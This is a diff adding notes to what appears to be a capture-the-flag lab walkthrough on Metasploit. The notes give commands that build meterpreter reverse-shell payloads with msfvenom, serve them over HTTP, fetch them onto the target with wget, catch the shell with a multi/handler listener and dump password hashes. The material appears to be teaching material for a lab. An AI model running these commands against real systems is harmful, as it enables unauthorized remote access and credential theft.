@@ -27,3 +27,45 @@ What is the NTLM hash of the password of the user "pirate"?
 
 hashdump
 meterpeter> hashdump
+
+# ip a
+
+inet 172.17.0.1/16
+
+# attacker host, port
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.201.99.36 LPORT=1234 -f elf > rev_shell.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.201.99.36 LPORT=1234 -f exe > rev_shell.exe
+
+# In attacking machine:
+
+python3 -m http.server 1234
+
+In the machine being attacked:
+
+wget http://ATTACKING_MACHINE_IP:1234/rev_shell.elf
+
+Now remember we need a listener on our shell for RCE:
+
+(Type these commands in the metasploit shell)
+
+use exploit/multi/handler
+
+set payload linux/x86/meterpreter/reverse_tcp
+
+Now just set the LHOST and LPORT the same you did in the exploit.
+Last thing to do is run that file and recieve the connection :
+
+chmod +x rev_shell.elf in the shell we have ssh the account
+
+Start the listener in your machine by the command told above.
+
+Run the file by ./rev_shell.elf
+
+You got the meterpreter reverse shell in your machine ;)
+
+#4 Use a post exploitation module to dump hashes of other users on the system.
+
+msfconsole
+
+run post/linux/gather/hashdump
